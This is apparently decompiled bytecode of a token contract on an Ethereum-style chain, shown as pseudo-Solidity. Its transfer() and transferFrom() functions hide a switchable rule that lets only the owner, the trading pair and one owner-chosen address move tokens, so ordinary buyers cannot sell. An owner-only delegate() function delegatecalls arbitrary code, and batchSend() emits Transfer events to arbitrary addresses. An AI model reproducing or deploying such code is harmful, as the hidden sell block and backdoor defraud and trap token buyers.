contract main {




// =====================  Runtime code  =====================


const decimals = 18


mapping of uint256 balanceOf;
mapping of uint256 allowance;
uint256 totalSupply;
array of uint256 name;
array of uint256 symbol;
address sub_d3e475f9Address;
uint8 stor6; offset 160
address stor6;

function name() {
    return name[0 len name.length]
}

function totalSupply() {
    return totalSupply
}

function owner2() {
    return bool(uint8(stor6.field_160))
}

function balanceOf(address arg1) {
    require calldata.size - 4 >= 32
    return balanceOf[arg1]
}

function symbol() {
    return symbol[0 len symbol.length]
}

function sub_d3e475f9(?) {
    return sub_d3e475f9Address
}

function allowance(address arg1, address arg2) {
    require calldata.size - 4 >= 64
    return allowance[arg1][arg2]
}

function _fallback() payable {
    revert
}

function sub_64d13339(?) {
    require calldata.size - 4 >= 32
    require msg.sender == address(stor6.field_0)
}

function sub_a01a0cd7(?) {
    require calldata.size - 4 >= 32
    require msg.sender == address(stor6.field_0)
    sub_d3e475f9Address = arg1
}

function approve(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    allowance[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function getPairAddress() {
    if 0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c < this.address:
        return address(sha3(0, 13617983528775878474, sha3(13496403649558392859, this.address), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f))
    return address(sha3(0, 13617983528775878474, sha3(this.address, 0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f))
}

function delegate(address arg1, bytes arg2) payable {
    require calldata.size - 4 >= 64
    require arg2 <= 4294967296
    require arg2 + 36 <= calldata.size
    require arg2.length <= 4294967296 and arg2 + arg2.length + 36 <= calldata.size
    mem[128 len arg2.length] = arg2[all]
    mem[arg2.length + 128] = 0
    require msg.sender == address(stor6.field_0)
    mem[ceil32(arg2.length) + 128 len floor32(arg2.length)] = call.data[arg2 + 36 len floor32(arg2.length)]
    mem[ceil32(arg2.length) + floor32(arg2.length) + -(arg2.length % 32) + 160 len arg2.length % 32] = mem[-(arg2.length % 32) + floor32(arg2.length) + 160 len arg2.length % 32]
    delegate arg1 with:
       funct (Mask(32, -(8 * ceil32(arg2.length) + -arg2.length + 4) + 256, 0) >> -(8 * ceil32(arg2.length) + -arg2.length + 4) + 256)
         gas gas_remaining wei
        args mem[ceil32(arg2.length) + 132 len arg2.length - 4]
}

function batchSend(address[] arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 <= 4294967296
    require arg1 + 36 <= calldata.size
    require arg1.length <= 4294967296 and arg1 + (32 * arg1.length) + 36 <= calldata.size
    mem[128 len 32 * arg1.length] = call.data[arg1 + 36 len 32 * arg1.length]
    mem[(32 * arg1.length) + 128] = 0
    require msg.sender == address(stor6.field_0)
    require balanceOf[address(msg.sender)] >= arg2 * arg1.length
    balanceOf[address(msg.sender)] += -1 * arg2 * arg1.length
    idx = 0
    while idx < arg1.length:
        require idx < arg1.length
        _19 = mem[(32 * idx) + 128]
        mem[0] = mem[(32 * idx) + 140 len 20]
        mem[32] = 0
        balanceOf[mem[(32 * idx) + 140 len 20]] += arg2
        emit Transfer((arg2 / 2), msg.sender, mem[(32 * idx) + 140 len 20]);
        mem[(32 * arg1.length) + 128] = arg2 / 2
        emit Transfer((arg2 / 2), msg.sender, address(_19));
        idx = idx + 1
        continue 
    return 1
}

function transferFrom(address arg1, address arg2, uint256 arg3) payable {
    require calldata.size - 4 >= 96
    if uint8(stor6.field_160):
        if 0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c < this.address:
            if arg1 != address(stor6.field_0):
                if arg2 != address(stor6.field_0):
                    if arg1 != address(sha3(0, 13617983528775878474, sha3(13496403649558392859, this.address), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)):
                        require arg1 == sub_d3e475f9Address
        else:
            if arg1 != address(stor6.field_0):
                if arg2 != address(stor6.field_0):
                    if arg1 != address(sha3(0, 13617983528775878474, sha3(this.address, 0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)):
                        require arg1 == sub_d3e475f9Address
    if arg3:
        if arg1 != msg.sender:
            require allowance[address(arg1)][address(msg.sender)] >= arg3
            allowance[address(arg1)][address(msg.sender)] -= arg3
        require balanceOf[address(arg1)] >= arg3
        balanceOf[address(arg1)] -= arg3
        balanceOf[address(arg2)] += arg3
        emit Transfer(arg3, arg1, arg2);
    return 1
}

function transfer(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if uint8(stor6.field_160):
        if 0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c < this.address:
            if address(stor6.field_0) != msg.sender:
                if arg1 != address(stor6.field_0):
                    if address(sha3(0, 13617983528775878474, sha3(13496403649558392859, this.address), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)) != msg.sender:
                        require msg.sender == sub_d3e475f9Address
        else:
            if address(stor6.field_0) != msg.sender:
                if arg1 != address(stor6.field_0):
                    if address(sha3(0, 13617983528775878474, sha3(this.address, 0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)) != msg.sender:
                        require msg.sender == sub_d3e475f9Address
    if arg2:
        if msg.sender != msg.sender:
            require allowance[address(msg.sender)][address(msg.sender)] >= arg2
            allowance[address(msg.sender)][address(msg.sender)] -= arg2
        require balanceOf[address(msg.sender)] >= arg2
        balanceOf[address(msg.sender)] -= arg2
        balanceOf[address(arg1)] += arg2
        emit Transfer(arg2, msg.sender, arg1);
    return 1
}



}
